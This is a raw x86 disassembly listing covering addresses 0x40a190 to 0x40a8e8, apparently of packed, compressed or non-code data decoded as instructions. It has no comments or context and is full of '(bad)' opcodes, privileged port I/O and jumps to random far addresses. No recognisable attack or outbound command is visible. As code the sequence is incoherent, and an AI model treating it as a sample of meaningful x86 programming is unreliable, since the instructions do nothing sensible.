  40a190:	scas   eax,DWORD PTR es:[edi]
  40a191:	daa    
  40a192:	dec    esi
  40a193:	shl    DWORD PTR [edx+0x32104f28],0x60
  40a19a:	inc    DWORD PTR [esi+ebx*2+0x6c]
  40a19e:	xchg   edi,eax
  40a19f:	cmp    al,0x9e
  40a1a1:	inc    ecx
  40a1a2:	cmp    al,BYTE PTR [edx+0x679d00fb]
  40a1a8:	mov    ch,0xd8
  40a1aa:	dec    edx
  40a1ab:	mov    bh,0xdc
  40a1ad:	and    ch,BYTE PTR [eax]
  40a1af:	bound  esp,QWORD PTR [eax]
  40a1b1:	test   BYTE PTR [ecx+0x1edbd0cf],al
  40a1b7:	ds popa 
  40a1b9:	sbb    eax,0xca80885b
  40a1be:	js     0x40a239
  40a1c0:	jp     0x40a1bd
  40a1c2:	ds push ebp
  40a1c4:	sbb    dh,BYTE PTR [ecx+0x4f]
  40a1c7:	test   BYTE PTR [eax-0x184cd53d],0x14
  40a1ce:	add    BYTE PTR [ecx],0x7e
  40a1d1:	sub    ebx,eax
  40a1d3:	popa   
  40a1d4:	push   cs
  40a1d5:	mov    edi,esp
  40a1d7:	sbb    al,0x7e
  40a1d9:	call   0xa6d:0x2cee9423
  40a1e0:	scas   al,BYTE PTR es:[edi]
  40a1e1:	ds out 0xe0,al
  40a1e4:	in     al,0x6d
  40a1e6:	sub    DWORD PTR [ebx+0x7e8cd9ad],esi
  40a1ec:	mov    edi,0x5607be36
  40a1f1:	mov    ebx,ss
  40a1f3:	mul    dl
  40a1f5:	inc    edi
  40a1f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1f7:	dec    eax
  40a1f8:	bound  edx,QWORD PTR [esi-0x2663e55]
  40a1fe:	loope  0x40a1cd
  40a200:	and    ecx,DWORD PTR [eax-0x6d]
  40a203:	and    eax,0x6e420ab0
  40a208:	xchg   edx,eax
  40a209:	dec    esp
  40a20a:	aam    0x31
  40a20c:	xchg   esi,eax
  40a20d:	jmp    0x40a1c3
  40a20f:	jnp    0x40a214
  40a211:	fs in  eax,0xba
  40a214:	xlat   BYTE PTR ds:[ebx]
  40a215:	inc    eax
  40a216:	pop    edi
  40a217:	inc    ebx
  40a218:	cs mov bh,0xb2
  40a21b:	int3   
  40a21c:	pusha  
  40a21d:	push   ds
  40a21e:	jecxz  0x40a1a5
  40a220:	ret    
  40a221:	test   BYTE PTR ds:0x543ee4f0,0xd2
  40a228:	in     al,dx
  40a229:	lods   al,BYTE PTR ds:[esi]
  40a22a:	cvtdq2ps xmm2,XMMWORD PTR [ebx+ebp*1+0x681b5cf7]
  40a232:	pop    ebp
  40a233:	jns    0x40a272
  40a235:	loopne 0x40a238
  40a237:	xchg   ebp,eax
  40a238:	fld    DWORD PTR [esi-0x7]
  40a23b:	popa   
  40a23c:	mov    eax,ds:0xeffb8468
  40a241:	cwde   
  40a242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a243:	dec    edx
  40a244:	push   cs
  40a245:	jo     0x40a219
  40a247:	pop    ss
  40a248:	jmp    0xe3d599ee
  40a24d:	cld    
  40a24e:	aaa    
  40a24f:	adc    esp,DWORD PTR [ecx-0x146382b2]
  40a255:	inc    edx
  40a256:	(bad)  
  40a257:	clc    
  40a258:	aas    
  40a259:	adc    al,0xcf
  40a25b:	ds daa 
  40a25d:	inc    ebx
  40a25e:	jl     0x40a296
  40a260:	push   ebx
  40a261:	loop   0x40a23f
  40a263:	fbstp  TBYTE PTR [eax]
  40a265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a266:	mov    edx,0xee6b0c49
  40a26b:	addr16 ja 0x40a23d
  40a26e:	out    dx,eax
  40a26f:	push   ebx
  40a270:	and    dl,BYTE PTR [ebx+ecx*8]
  40a273:	(bad)  
  40a275:	(bad)  
  40a276:	mov    ds:0x4af86484,eax
  40a27b:	and    ch,ch
  40a27d:	mov    dh,0xb7
  40a27f:	stos   DWORD PTR es:[edi],eax
  40a280:	scas   eax,DWORD PTR es:[edi]
  40a281:	into   
  40a282:	aaa    
  40a283:	push   esi
  40a284:	stc    
  40a285:	xlat   BYTE PTR ds:[ebx]
  40a286:	stos   BYTE PTR es:[edi],al
  40a287:	xchg   ecx,eax
  40a288:	fldl2t 
  40a28a:	jl     0x40a2b9
  40a28c:	mov    al,ds:0x32e13837
  40a291:	std    
  40a292:	add    al,0x97
  40a294:	and    DWORD PTR [esi],0x5c450007
  40a29a:	ficom  DWORD PTR [ebx+eax*2-0x627e7d6e]
  40a2a1:	ja     0x40a231
  40a2a3:	retf   
  40a2a4:	xchg   BYTE PTR [edx-0x3f752905],ch
  40a2aa:	pop    ds
  40a2ab:	scas   eax,DWORD PTR es:[edi]
  40a2ac:	mov    ss,WORD PTR [edx]
  40a2ae:	and    bh,dl
  40a2b0:	scas   eax,DWORD PTR es:[edi]
  40a2b1:	xor    ebx,DWORD PTR [ebx-0x16]
  40a2b4:	sub    BYTE PTR [eax+0x698441eb],al
  40a2ba:	dec    ebx
  40a2bb:	cmp    eax,0x525a2ee2
  40a2c0:	es inc ecx
  40a2c2:	lock rol DWORD PTR [eax+0x51],1
  40a2c6:	imul   BYTE PTR [edi+0x3d2c7d2a]
  40a2cc:	sub    eax,0xfafb2e7f
  40a2d1:	or     eax,0xbc750d34
  40a2d6:	pop    es
  40a2d7:	aam    0x8b
  40a2d9:	sbb    BYTE PTR [bp-0x3f64],bh
  40a2de:	push   esi
  40a2df:	push   ebx
  40a2e0:	lods   al,BYTE PTR ds:[esi]
  40a2e1:	adc    DWORD PTR [ecx-0x6e],0x6e0ee1a9
  40a2e8:	mov    fs,WORD PTR [eax]
  40a2ea:	les    ecx,FWORD PTR [ebx-0x49]
  40a2ed:	mov    ebp,DWORD PTR gs:[edx+0x62]
  40a2f1:	int3   
  40a2f2:	mov    BYTE PTR [edi],al
  40a2f4:	(bad)  
  40a2f5:	pop    esp
  40a2f6:	cmp    eax,0x64f6de41
  40a2fb:	(bad)  
  40a2fc:	cld    
  40a2fd:	div    DWORD PTR [esi]
  40a2ff:	cmp    al,0xc6
  40a301:	sub    dh,BYTE PTR [ebx]
  40a303:	stc    
  40a304:	jg     0x40a316
  40a306:	add    eax,0xbcdb762b
  40a30b:	inc    esp
  40a30c:	arpl   WORD PTR [eax-0x16],cx
  40a30f:	fcomip st,st(2)
  40a311:	mov    esp,DWORD PTR [esi+0x6a]
  40a314:	and    ecx,DWORD PTR [esi]
  40a316:	dec    eax
  40a317:	sbb    eax,0x4bb3dc30
  40a31c:	fs pop ebx
  40a31e:	rdtsc  
  40a320:	rol    BYTE PTR [edi-0x778106d2],0x72
  40a327:	inc    esp
  40a328:	push   edx
  40a329:	lods   eax,DWORD PTR ds:[esi]
  40a32a:	iret   
  40a32b:	add    dl,BYTE PTR [edi]
  40a32d:	in     eax,dx
  40a32e:	xor    eax,DWORD PTR [edi-0x4f]
  40a331:	gs push cs
  40a333:	or     esi,DWORD PTR [edi+ecx*4+0x73a2682e]
  40a33a:	inc    ecx
  40a33b:	mov    eax,ds:0xe49fb08a
  40a340:	mov    ds:0xd664826f,eax
  40a345:	mov    ah,0xa2
  40a347:	and    eax,0xa8e640c8
  40a34c:	aad    0x3
  40a34e:	mov    ebx,0x913d97d4
  40a353:	xchg   ebx,eax
  40a354:	pop    edx
  40a355:	mov    ds:0xeba005f0,al
  40a35a:	jle    0x40a313
  40a35c:	in     eax,dx
  40a35d:	repnz (bad) 
  40a35f:	(bad)  
  40a360:	jns    0x40a36c
  40a362:	cmc    
  40a363:	jg     0x40a2ea
  40a365:	scas   al,BYTE PTR es:[edi]
  40a366:	pop    esi
  40a367:	push   ss
  40a368:	jno    0x40a396
  40a36a:	in     eax,0x70
  40a36c:	inc    ebx
  40a36d:	loopne 0x40a2f9
  40a36f:	ret    0x6f58
  40a372:	xor    eax,0xb8e5774b
  40a377:	pop    esp
  40a378:	test   al,0x99
  40a37a:	ds add al,0x17
  40a37d:	cdq    
  40a37e:	loopne 0x40a30e
  40a380:	(bad)  
  40a381:	fadd   DWORD PTR [eax]
  40a383:	cld    
  40a384:	xor    ebp,ebx
  40a386:	xchg   ecx,eax
  40a387:	pop    esi
  40a388:	cmc    
  40a389:	add    BYTE PTR [ebp-0x451579c7],al
  40a38f:	int    0xa5
  40a391:	div    DWORD PTR [edi]
  40a393:	or     edi,DWORD PTR [ebx+0x504b8bd8]
  40a399:	pop    ebp
  40a39a:	pop    ebx
  40a39b:	into   
  40a39c:	mov    ebp,0x16f08571
  40a3a1:	mov    WORD PTR es:[ecx-0x63b06b5c],gs
  40a3a8:	(bad)  
  40a3a9:	jo     0x40a3df
  40a3ab:	inc    ebx
  40a3ac:	mov    ds:0x4611d5cb,al
  40a3b1:	mov    ah,0xe3
  40a3b3:	mul    BYTE PTR [eax]
  40a3b5:	dec    ebp
  40a3b6:	push   ecx
  40a3b7:	or     BYTE PTR [ecx-0x2f],ah
  40a3ba:	dec    eax
  40a3bb:	fsubr  QWORD PTR [edi]
  40a3bd:	repnz xlat BYTE PTR ds:[ebx]
  40a3bf:	ret    
  40a3c0:	rcl    BYTE PTR [ebx+0x6e],1
  40a3c3:	xchg   esp,eax
  40a3c4:	mov    bh,0xb8
  40a3c6:	pusha  
  40a3c7:	scas   eax,DWORD PTR es:[edi]
  40a3c8:	jle    0x40a444
  40a3ca:	icebp  
  40a3cb:	in     eax,0xdd
  40a3cd:	inc    ebx
  40a3ce:	inc    esi
  40a3cf:	test   BYTE PTR [ecx-0x4e9baa93],bl
  40a3d5:	xchg   BYTE PTR [ebx+0x6597885],bh
  40a3db:	push   0x545a994a
  40a3e0:	fcmovb st,st(2)
  40a3e2:	test   DWORD PTR [ebp+ecx*1-0x5a50675],ebx
  40a3e9:	mov    esi,0x220c2b04
  40a3ee:	sub    BYTE PTR [eax],ch
  40a3f0:	out    0x54,al
  40a3f2:	cwde   
  40a3f3:	dec    edx
  40a3f4:	and    cl,bl
  40a3f6:	outs   dx,DWORD PTR ds:[esi]
  40a3f7:	push   0xc21951d5
  40a3fc:	mov    WORD PTR [ebx+0xa05faad],ss
  40a402:	lods   al,BYTE PTR ds:[esi]
  40a403:	xchg   ecx,eax
  40a404:	jbe    0x40a445
  40a406:	adc    ah,BYTE PTR [edx]
  40a408:	out    dx,al
  40a409:	inc    edx
  40a40a:	pop    edx
  40a40b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a40c:	mov    esi,0x3acdeffb
  40a411:	push   ecx
  40a412:	ds loop 0x40a3dc
  40a415:	shl    BYTE PTR [ebx+0x1e],1
  40a418:	lea    esi,[edx+0x652c7cb8]
  40a41e:	mov    bh,0x57
  40a420:	inc    eax
  40a421:	div    BYTE PTR [edx+0x59]
  40a424:	and    al,0xdf
  40a426:	inc    edi
  40a427:	(bad)  
  40a428:	daa    
  40a429:	push   ebp
  40a42a:	pop    esi
  40a42b:	jmp    0xe649:0xed336658
  40a432:	mov    eax,0x217066a6
  40a437:	jmp    DWORD PTR [edx-0x23]
  40a43a:	shr    BYTE PTR [esi+0x0],cl
  40a43d:	dec    ecx
  40a43e:	add    eax,0x9a9bbc66
  40a443:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a444:	mov    bl,0xfc
  40a446:	jns    0x40a40c
  40a448:	fadd   st(0),st
  40a44a:	pop    ds
  40a44b:	xchg   edi,eax
  40a44c:	jl     0x40a3e7
  40a44e:	sbb    BYTE PTR [edx+0x166140e7],al
  40a454:	hlt    
  40a455:	data16 mov bh,0xba
  40a458:	stos   BYTE PTR es:[edi],al
  40a459:	xchg   ebp,eax
  40a45a:	test   DWORD PTR [ebx+0x643ff594],ebx
  40a460:	dec    ebp
  40a461:	mov    WORD PTR [edx],es
  40a463:	(bad)  
  40a464:	sahf   
  40a465:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a466:	(bad)  
  40a467:	pop    ds
  40a468:	pop    esi
  40a469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a46a:	enter  0x2bd5,0x44
  40a46e:	call   0xe2e4:0x1b354309
  40a475:	mov    DWORD PTR [esi*2+0x79b2434d],esp
  40a47c:	call   0xcd38:0xa9905cfb
  40a483:	(bad)  
  40a484:	cs loop 0x40a4e1
  40a487:	sbb    DWORD PTR [edi+0x490d1fed],edx
  40a48d:	loope  0x40a4f8
  40a48f:	sbb    al,0xd2
  40a491:	inc    ebp
  40a492:	pop    ebx
  40a493:	jg     0x40a479
  40a495:	mov    ds:0x19787fd9,al
  40a49a:	mov    dh,0x5c
  40a49c:	adc    al,0x71
  40a49e:	call   0x5f19579c
  40a4a3:	cdq    
  40a4a4:	pop    ebx
  40a4a5:	add    ch,dh
  40a4a7:	es or  al,0xbd
  40a4aa:	jnp    0x40a4ff
  40a4ac:	inc    esi
  40a4ad:	test   ebp,edx
  40a4af:	clc    
  40a4b0:	sbb    bl,BYTE PTR [edi]
  40a4b2:	scas   al,BYTE PTR es:[edi]
  40a4b3:	retf   
  40a4b4:	sub    edi,edx
  40a4b6:	jo     0x40a4b6
  40a4b8:	js     0x40a459
  40a4ba:	xor    BYTE PTR [ebx-0x4b],bh
  40a4bd:	dec    esp
  40a4be:	pop    edx
  40a4bf:	add    al,0x49
  40a4c1:	fs inc ebp
  40a4c3:	cmp    BYTE PTR [esi-0x7abbd7c9],ch
  40a4c9:	fdivr  st(0),st
  40a4cb:	pushf  
  40a4cc:	scas   al,BYTE PTR es:[edi]
  40a4cd:	iret   
  40a4ce:	retf   0x5537
  40a4d1:	int    0x9e
  40a4d3:	sub    BYTE PTR [esi+0x36f6c973],ch
  40a4d9:	dec    ebp
  40a4da:	pusha  
  40a4db:	pop    ebp
  40a4dc:	adc    BYTE PTR [ebp+0x7f],ah
  40a4df:	sahf   
  40a4e0:	push   esi
  40a4e1:	cmp    eax,0x391456f7
  40a4e6:	mov    edx,0x99d2443e
  40a4eb:	pop    ss
  40a4ec:	sub    al,0xa
  40a4ee:	xor    eax,0xe0a841be
  40a4f3:	or     BYTE PTR [edx-0x1e36f394],cl
  40a4f9:	mov    ?,WORD PTR [ebx-0xff91cd5]
  40a4ff:	cld    
  40a500:	out    0x22,eax
  40a502:	fsub   DWORD PTR [edx-0x55]
  40a505:	jnp    0x40a4b9
  40a507:	add    dl,BYTE PTR [ecx+0x2bedf8b2]
  40a50d:	inc    ebx
  40a50e:	rcr    BYTE PTR [edx-0x64],1
  40a511:	push   ecx
  40a512:	ror    bl,cl
  40a514:	enter  0x247d,0x2e
  40a518:	clc    
  40a519:	mov    ecx,0x80a5f25d
  40a51e:	xor    al,0xe9
  40a520:	cmp    eax,0xb1d19b6
  40a525:	mov    cl,0xa1
  40a527:	dec    edx
  40a528:	mov    dh,0x52
  40a52a:	xchg   ecx,esi
  40a52c:	jge    0x40a5a2
  40a52e:	ins    DWORD PTR es:[edi],dx
  40a52f:	test   DWORD PTR ds:0x71d14617,edi
  40a535:	pop    ebx
  40a536:	out    0x89,eax
  40a538:	cmp    ebx,esi
  40a53a:	js     0x40a54e
  40a53c:	hlt    
  40a53d:	lds    edi,FWORD PTR [esi-0x31d665f]
  40a543:	dec    esi
  40a544:	gs stos BYTE PTR es:[edi],al
  40a546:	mov    cl,0x96
  40a548:	jle    0x40a5b5
  40a54a:	push   ds
  40a54b:	xor    eax,0xcefa8101
  40a550:	les    edi,FWORD PTR [ebx]
  40a552:	mov    eax,ds:0xb49e915c
  40a557:	and    BYTE PTR [ebx-0x23],ah
  40a55a:	loope  0x40a59c
  40a55c:	dec    esp
  40a55d:	jnp    0x40a4f6
  40a55f:	call   0xec4a08a
  40a564:	(bad)  [edi]
  40a566:	cmp    BYTE PTR [ebx-0x34],bh
  40a569:	ds jecxz 0x40a52b
  40a56c:	mov    ah,0xfc
  40a56e:	rol    DWORD PTR [edi],1
  40a570:	push   ss
  40a571:	adc    eax,0x758f307b
  40a576:	test   cl,bh
  40a578:	fdivr  DWORD PTR [edx+edi*2]
  40a57b:	aad    0x2a
  40a57d:	in     al,dx
  40a57e:	pop    esp
  40a57f:	dec    esp
  40a580:	fwait
  40a581:	xor    al,0xfe
  40a583:	bound  edi,QWORD PTR [esp+eax*8]
  40a586:	mov    ecx,0xf533fbc4
  40a58b:	xor    esp,DWORD PTR [edi-0x264e9cb8]
  40a591:	cli    
  40a592:	out    0x0,eax
  40a594:	imul   edi,ebp,0x794d20ae
  40a59a:	and    BYTE PTR [edx],dh
  40a59c:	xor    al,0xe4
  40a59e:	jne    0x40a617
  40a5a0:	adc    DWORD PTR [eax-0x79],ecx
  40a5a3:	inc    ecx
  40a5a4:	sbb    DWORD PTR [eax-0x3d],ebx
  40a5a7:	bound  ebx,QWORD PTR [esi]
  40a5a9:	dec    BYTE PTR [ecx-0x57811b3]
  40a5af:	sbb    BYTE PTR [ebp-0x25ba2d69],bl
  40a5b5:	dec    eax
  40a5b6:	inc    ebp
  40a5b7:	lods   al,BYTE PTR ds:[esi]
  40a5b8:	fidivr WORD PTR [edx-0x1f]
  40a5bb:	sbb    BYTE PTR [ecx-0x55],dh
  40a5be:	rcl    eax,1
  40a5c0:	aas    
  40a5c1:	xchg   ebx,eax
  40a5c2:	jns    0x40a633
  40a5c4:	push   esi
  40a5c5:	popa   
  40a5c6:	mov    ah,0x91
  40a5c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5c9:	ins    DWORD PTR es:[edi],dx
  40a5ca:	dec    esi
  40a5cb:	dec    edx
  40a5cc:	pop    ds
  40a5cd:	aam    0x96
  40a5cf:	pop    ax
  40a5d1:	ret    
  40a5d2:	ret    
  40a5d3:	xor    esp,DWORD PTR [ecx+0x28a8523a]
  40a5d9:	adc    al,0x8
  40a5db:	in     al,0x1c
  40a5dd:	pop    edi
  40a5de:	call   0xcf990ea8
  40a5e3:	les    edi,FWORD PTR [esi+ebp*8+0x1c94372d]
  40a5ea:	sbb    edx,DWORD PTR [eax+0x6c]
  40a5ed:	and    ebp,DWORD PTR [eax-0x1d2a6f6d]
  40a5f3:	cdq    
  40a5f4:	rol    BYTE PTR [edi+ecx*8-0x1dc9b21c],1
  40a5fb:	push   esi
  40a5fc:	or     eax,0x71c595a1
  40a601:	sahf   
  40a602:	js     0x40a657
  40a604:	push   edx
  40a605:	push   edi
  40a606:	cmc    
  40a607:	xor    al,0xd7
  40a609:	test   eax,0x482796da
  40a60e:	cmp    bl,BYTE PTR [edx+0xf]
  40a611:	scas   al,BYTE PTR es:[edi]
  40a612:	mov    BYTE PTR [eax+eiz*2-0x33ed720f],dh
  40a619:	adc    BYTE PTR [eax+0x3b],bh
  40a61c:	xor    DWORD PTR [ecx+0x45a79e84],edi
  40a622:	mov    ch,0x2d
  40a624:	xor    cl,BYTE PTR [ecx]
  40a626:	std    
  40a627:	or     edi,edi
  40a629:	ror    DWORD PTR [esi+0xc2bcb6a],0x5
  40a630:	cdq    
  40a631:	gs push es
  40a633:	out    0xd4,eax
  40a635:	js     0x40a5e0
  40a637:	mov    eax,0xb802b692
  40a63c:	mov    ds:0xdb4cd3f9,eax
  40a641:	dec    ecx
  40a642:	lahf   
  40a643:	call   0x6efa:0xd6ea125f
  40a64a:	sub    bh,BYTE PTR [edx-0x4c31718f]
  40a650:	(bad)  
  40a651:	cli    
  40a652:	lock mov al,ds:0x46334572
  40a658:	xchg   ecx,eax
  40a659:	xor    DWORD PTR [edi-0xdc03565],edi
  40a65f:	xchg   edi,eax
  40a660:	xchg   BYTE PTR [ebx+ebx*1],al
  40a663:	and    al,0x38
  40a665:	dec    esp
  40a666:	sbb    ah,BYTE PTR [esi+0x1e]
  40a669:	ins    BYTE PTR es:[edi],dx
  40a66a:	repnz scas al,BYTE PTR es:[edi]
  40a66c:	xchg   ebx,eax
  40a66d:	jmp    0xd77c:0x101047c6
  40a674:	fs retf 0x3163
  40a678:	mov    al,ds:0x2d0da239
  40a67d:	mov    bl,0xf3
  40a67f:	mov    esi,0x18b5b562
  40a684:	push   es
  40a685:	inc    edx
  40a686:	mov    dl,0xec
  40a688:	xor    esi,DWORD PTR [edi-0x1c]
  40a68b:	setno  BYTE PTR ds:0x444cc790
  40a692:	test   DWORD PTR [edx],esp
  40a694:	pop    ecx
  40a695:	loopne 0x40a678
  40a697:	mov    cl,0xea
  40a699:	outs   dx,BYTE PTR ds:[esi]
  40a69a:	(bad)  
  40a69b:	das    
  40a69c:	cmp    eax,0xb274ac62
  40a6a1:	mov    ds:0x4c714b54,al
  40a6a6:	outs   dx,DWORD PTR ds:[esi]
  40a6a7:	jg     0x40a6e3
  40a6a9:	jns    0x40a63e
  40a6ab:	ins    BYTE PTR es:[edi],dx
  40a6ac:	push   ebp
  40a6ad:	xchg   ecx,eax
  40a6ae:	test   eax,0x7b67b2ee
  40a6b3:	fidiv  WORD PTR es:[eax-0x54]
  40a6b7:	pop    ds
  40a6b8:	dec    eax
  40a6b9:	fbstp  TBYTE PTR [ebp+0x1c]
  40a6bc:	fist   DWORD PTR [eax+esi*2+0x280b4839]
  40a6c3:	or     ebx,DWORD PTR [edx-0x46f11500]
  40a6c9:	xchg   BYTE PTR [ebx+eiz*1-0x4f98033a],dl
  40a6d0:	pop    ds
  40a6d1:	aaa    
  40a6d2:	push   es
  40a6d3:	adc    edx,esi
  40a6d5:	sub    ebx,DWORD PTR [edx+0x19cda461]
  40a6db:	in     eax,0x12
  40a6dd:	mov    eax,0x2d556e1
  40a6e2:	push   esi
  40a6e3:	or     DWORD PTR [ebp+0x9ad5f2e],0xe9fa434b
  40a6ed:	mov    edx,0x6fce599d
  40a6f2:	cld    
  40a6f3:	lds    esp,FWORD PTR [eax-0x8891b69]
  40a6f9:	dec    edx
  40a6fa:	jmp    0x40a6c8
  40a6fc:	pushf  
  40a6fd:	outs   dx,BYTE PTR ds:[esi]
  40a6fe:	xchg   ah,ch
  40a700:	xor    DWORD PTR [ebx+0x43],esi
  40a703:	push   ss
  40a704:	(bad)  
  40a705:	out    dx,eax
  40a706:	xchg   esp,eax
  40a707:	fdiv   DWORD PTR [edi-0x26]
  40a70a:	sub    al,0xcd
  40a70c:	ficomp DWORD PTR [ebx+0x0]
  40a70f:	xchg   esp,eax
  40a710:	popf   
  40a711:	dec    esp
  40a712:	popa   
  40a713:	ds pushf 
  40a715:	(bad)  
  40a717:	cwde   
  40a718:	cli    
  40a719:	adc    BYTE PTR [edi+0x60],ah
  40a71c:	mov    ebx,0xe56bfeb6
  40a721:	ds jno 0x40a744
  40a724:	adc    eax,0x79f21436
  40a729:	sub    DWORD PTR [esi],ecx
  40a72b:	xor    BYTE PTR [edx+eax*1+0x6],0x97
  40a730:	inc    edx
  40a731:	adc    al,0x10
  40a733:	leave  
  40a734:	adc    ebp,DWORD PTR [edi+0x3cc63e00]
  40a73a:	in     al,dx
  40a73b:	(bad)  
  40a73c:	fld    QWORD PTR [ebx-0x61]
  40a73f:	(bad)  ds:0x9208c23
  40a745:	out    0x68,al
  40a747:	scas   eax,DWORD PTR es:[edi]
  40a748:	adc    esi,DWORD PTR [eax]
  40a74a:	inc    ebx
  40a74b:	mov    dl,0xc5
  40a74d:	adc    edx,DWORD PTR [ebx]
  40a74f:	sar    BYTE PTR [edx+eiz*2+0x7961a14f],cl
  40a756:	and    DWORD PTR [edi-0x1cc73425],ecx
  40a75c:	sub    bh,BYTE PTR [ebx-0x3f]
  40a75f:	mov    BYTE PTR [edx-0x4d],bl
  40a762:	js     0x40a78d
  40a764:	cld    
  40a765:	inc    ecx
  40a766:	popa   
  40a767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a768:	scas   eax,DWORD PTR es:[edi]
  40a769:	pop    ecx
  40a76a:	(bad)  
  40a76b:	mov    al,0xb3
  40a76d:	xchg   edi,eax
  40a76e:	into   
  40a76f:	loop   0x40a7a5
  40a771:	test   BYTE PTR [eax+0x78710005],0xff
  40a778:	test   eax,0x83fb0b53
  40a77d:	or     bh,0x8e
  40a780:	cmp    edi,DWORD PTR [esi-0x32f1eff]
  40a786:	add    DWORD PTR [ebx+0x64],esp
  40a789:	xchg   esp,eax
  40a78a:	cdq    
  40a78b:	test   DWORD PTR [edx-0x28],ecx
  40a78e:	div    DWORD PTR [edi-0x2c]
  40a791:	pop    eax
  40a792:	mov    ds:0x4a4b9abc,eax
  40a797:	dec    ebp
  40a798:	je     0x40a7fb
  40a79a:	push   ebp
  40a79b:	aad    0x67
  40a79d:	jle    0x40a773
  40a79f:	repz and al,0x20
  40a7a2:	push   ss
  40a7a3:	std    
  40a7a4:	cmp    DWORD PTR [ebx+0x18eb51dd],ecx
  40a7aa:	pushf  
  40a7ab:	jg     0x40a81f
  40a7ad:	mov    DWORD PTR [ecx-0x2f],edx
  40a7b0:	or     al,0xd2
  40a7b2:	inc    edx
  40a7b3:	add    eax,0xed081d87
  40a7b8:	sub    DWORD PTR [esi],ecx
  40a7ba:	mov    ds:0xfb52ac62,eax
  40a7bf:	outs   dx,BYTE PTR ds:[esi]
  40a7c0:	iret   
  40a7c1:	test   DWORD PTR [ecx+0x6c],ebx
  40a7c4:	adc    DWORD PTR [edx+0x27d0bac1],0xe18236ed
  40a7ce:	mov    bh,0xff
  40a7d0:	add    BYTE PTR [eax],al
  40a7d2:	in     eax,0xf5
  40a7d4:	dec    edx
  40a7d5:	repz or DWORD PTR [ecx],esi
  40a7d8:	cmp    al,0x5f
  40a7da:	bnd jae 0x40a805
  40a7dd:	aam    0x28
  40a7df:	mov    edi,0xd442418a
  40a7e4:	in     eax,0x64
  40a7e6:	sbb    BYTE PTR [edx+ebp*4-0x2c072526],al
  40a7ed:	repnz icebp 
  40a7ef:	sub    BYTE PTR [eax],bl
  40a7f1:	and    DWORD PTR [esi-0x3e5771f5],edi
  40a7f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7f8:	gs ret 0x6b76
  40a7fc:	push   esi
  40a7fd:	jne    0x40a79a
  40a7ff:	pop    ebx
  40a800:	mov    fs,WORD PTR [edi-0x12b40d85]
  40a806:	in     al,0xd2
  40a808:	aad    0xc6
  40a80a:	push   ebp
  40a80b:	cli    
  40a80c:	cmp    ebp,DWORD PTR [ebx+0x16]
  40a80f:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40a811:	cwde   
  40a812:	jmp    0x18d1d3e0
  40a817:	cs cli 
  40a819:	push   ds
  40a81a:	dec    ebx
  40a81b:	fbld   TBYTE PTR [eax+ecx*4]
  40a81e:	pusha  
  40a81f:	adc    BYTE PTR [edx],0x89
  40a822:	rol    BYTE PTR [ebx+0x6a],0x0
  40a826:	dec    esi
  40a827:	add    eax,DWORD PTR [eax]
  40a829:	mov    bl,0x75
  40a82b:	mov    ebp,0x23e22316
  40a830:	leave  
  40a831:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a832:	sub    ecx,edx
  40a834:	out    dx,eax
  40a835:	mov    cl,0xed
  40a837:	jp     0x40a814
  40a839:	mov    cl,0xae
  40a83b:	jl     0x40a857
  40a83d:	ins    DWORD PTR es:[edi],dx
  40a83e:	and    DWORD PTR [edi+0xb],esp
  40a841:	jo     0x40a7c7
  40a843:	dec    ebx
  40a844:	or     bl,BYTE PTR [esi-0x25f70b5f]
  40a84a:	fmul   DWORD PTR [ebx+0x30]
  40a84d:	je     0x40a85b
  40a84f:	inc    esi
  40a850:	jae    0x40a7ec
  40a852:	xchg   ebp,eax
  40a853:	and    bh,BYTE PTR [eax-0x3025e82f]
  40a859:	jno    0x40a7ee
  40a85b:	ret    
  40a85c:	jmp    0x40a831
  40a85e:	fdivr  QWORD PTR [eax+0x5c]
  40a861:	fdivr  DWORD PTR [edx-0x5d]
  40a864:	(bad)  
  40a866:	and    ebp,DWORD PTR [edi]
  40a868:	mov    bl,0xd4
  40a86a:	xchg   edx,eax
  40a86b:	out    dx,al
  40a86c:	cmp    edx,esp
  40a86e:	pop    ebp
  40a86f:	xchg   ebp,eax
  40a870:	cmp    eax,DWORD PTR [edi+0x74]
  40a873:	jg     0x40a853
  40a875:	jmp    0x40a88e
  40a877:	push   ds
  40a878:	jl     0x40a887
  40a87a:	ror    edx,0x14
  40a87d:	jecxz  0x40a841
  40a87f:	sti    
  40a880:	add    BYTE PTR fs:[ebx],ah
  40a883:	cmp    DWORD PTR ds:0x4305d260,edi
  40a889:	jae    0x40a854
  40a88b:	ins    BYTE PTR es:[edi],dx
  40a88c:	push   esp
  40a88d:	aas    
  40a88e:	imul   edx,DWORD PTR [eax],0xff6a6f40
  40a894:	loope  0x40a908
  40a896:	jmp    0x4d6f48b9
  40a89b:	xchg   DWORD PTR [ebp-0x18],esp
  40a89e:	ret    
  40a89f:	xchg   esi,eax
  40a8a0:	jnp    0x40a86a
  40a8a2:	ds (bad) 
  40a8a4:	enter  0xaf86,0x2d
  40a8a8:	gs dec ebp
  40a8aa:	add    al,0x30
  40a8ac:	pop    ebp
  40a8ad:	retf   0xcf2
  40a8b0:	or     DWORD PTR [esi],esi
  40a8b2:	push   0xdcd2fbe6
  40a8b7:	mov    ebp,0x7e53951a
  40a8bc:	ja     0x40a8f6
  40a8be:	mov    ch,0x30
  40a8c0:	mov    ss:0xcb48a6e4,al
  40a8c6:	jl     0x40a8a2
  40a8c8:	cwde   
  40a8c9:	pop    esp
  40a8ca:	sbb    DWORD PTR [eax+ebp*4+0xc1b570b],esp
  40a8d1:	add    esi,esp
  40a8d3:	jnp    0x40a8b7
  40a8d5:	xor    eax,esp
  40a8d7:	inc    ebx
  40a8d8:	push   0xffffff81
  40a8da:	sbb    ebp,DWORD PTR [ebx]
  40a8dc:	aam    0x1b
  40a8de:	or     eax,0x477b467
  40a8e3:	mov    ecx,0x3cb6ad73
  40a8e8:	retf   
